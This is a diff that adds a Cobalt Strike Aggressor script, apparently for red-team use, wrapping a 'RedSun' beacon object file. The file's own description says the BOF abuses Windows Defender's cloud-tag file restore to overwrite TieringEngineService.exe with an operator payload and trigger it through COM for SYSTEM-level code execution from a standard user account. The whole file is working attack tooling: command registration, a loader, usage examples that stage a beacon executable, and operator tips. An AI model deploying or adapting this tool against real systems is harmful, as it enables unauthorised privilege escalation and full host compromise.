@@ -1,0 +1,88 @@
+#
+# redsun.cna - RedSun BOF Aggressor Script
+#
+# Exploits Windows Defender's cloud-tag file restore behaviour to overwrite
+# TieringEngineService.exe with an operator-supplied payload, then triggers
+# the service via COM for SYSTEM code execution.
+#
+# Based on: https://github.com/Nightmare-Eclipse/RedSun
+#
+
+# ============================================================================
+# Helper: load and execute the BOF (x64 only)
+# ============================================================================
+
+sub redsun_exec {
+    local('$bid $args $barch $handle $data $packed');
+    $bid  = $1;
+    $args = $2;
+
+    $barch = barch($bid);
+    if ($barch ne "x64") {
+        berror($bid, "RedSun only supports x64 beacons");
+        return;
+    }
+
+    $handle = openf(script_resource("bin/redsun.x64.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "Failed to load BOF: bin/redsun.x64.o  (run build.bat first)");
+        return;
+    }
+
+    $packed = bof_pack($bid, "z", $args);
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
+# ============================================================================
+# redsun - stage a payload to SYSTEM via Defender cloud-tag race
+# ============================================================================
+
+beacon_command_register(
+    "redsun",
+    "Escalate to SYSTEM via Windows Defender cloud-tag restore (CVE RedSun PoC)",
+
+    "Exploits Windows Defender's cloud-tag file-restore behaviour to overwrite\n" .
+    "C:\\Windows\\System32\\TieringEngineService.exe with an arbitrary payload,\n" .
+    "then triggers the service via COM for SYSTEM code execution.\n\n" .
+
+    "Requirements:\n" .
+    "  - x64 beacon\n" .
+    "  - Windows Defender with real-time protection ENABLED\n" .
+    "  - Volume Shadow Copy Service (VSS) reachable\n" .
+    "  - Standard user privileges (no admin required for exploit)\n\n" .
+
+    "Usage:\n" .
+    "   redsun /payload:C:\\path\\to\\payload.exe\n\n" .
+
+    "Examples:\n" .
+    "   redsun /payload:C:\\Users\\Public\\beacon.exe\n" .
+    "   redsun /payload:C:\\Windows\\System32\\cmd.exe\n\n" .
+
+    "Notes:\n" .
+    "  - The exploit may take up to ~120 seconds waiting for Defender to respond.\n" .
+    "  - TieringEngineService.exe is overwritten; restore it after the op.\n" .
+    "  - This BOF blocks the beacon thread until completion.\n" .
+    "    Stage a sacrificial beacon or use a sleep-0 beacon for best results.\n"
+);
+
+alias redsun {
+    local('$bid $args');
+    $bid  = $1;
+    $args = substr($0, 8);   # everything after "redsun "
+
+    if (strlen(trim($args)) == 0) {
+        berror($bid, "Usage: redsun /payload:C:\\path\\to\\payload.exe");
+        return;
+    }
+
+    if (!-contains $args "/payload:") {
+        berror($bid, "redsun: missing /payload: argument\nUsage: redsun /payload:C:\\path\\to\\payload.exe");
+        return;
+    }
+
+    btask($bid, "RedSun: staging payload via Defender cloud-tag exploit...");
+    redsun_exec($bid, $args);
+}
